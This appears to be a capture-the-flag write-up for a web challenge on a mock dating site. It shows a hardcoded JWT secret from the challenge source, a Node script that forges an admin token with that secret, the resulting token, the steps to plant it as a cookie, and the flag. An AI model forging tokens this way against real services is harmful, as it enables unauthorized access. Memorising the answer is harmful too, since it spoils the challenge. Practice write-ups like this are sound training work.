# vlookup_hot_singles

## Difficulty

Easy

## Points Earned

100

## Description

> looks like this is some kind of dating site for nerds? weird, figure out who the admin is and access their panel
> 
> 50 point hint: what to do, but not how to do it
> 
> Author: arepi
> 
> https://vlookup-hot-singles.jellyc.tf/

![vlookup_hot_singles website](./images/vlookup_hot_singles.png "vlookup_hot_singles")

## Solution

Forge a JWT to access the admin panel.

The source code gives us some hints about what the JWT should look like:

```python
JWT_SECRET = "singaQu5aeWoh1vuoJuD]ooJ9aeh2soh"

def is_admin(token):
    data = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    return data["user"] == "jelly"
```

I wrote a Node script to generate the JWT:

```js
 const sign = require('jwt-encode');
 const secret = 'singaQu5aeWoh1vuoJuD]ooJ9aeh2soh';
 const data = {
     user: "jelly"
 };
 const jwt = sign(data, secret);
 console.log(jwt);
```

Which gives me `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiamVsbHkifQ.7wQ41K0c7OZqWaePlf3v0QKuX-jOc4kFqks_eWrfQhE`.

Then I opened Chrome devtools and went to cookies under Application > Storage. Paste the encoded JWT into the `token` value field and then you should be able to access the admin panel.

![vlookup_hot_singles solution](./images/vlookup_hot_singles_sol.png "vlookup_hot_singles solution")

## Flag

`jellyCTF{i_am_b3c0m3_awawa_d3str0y3r_0f_f3m4135}`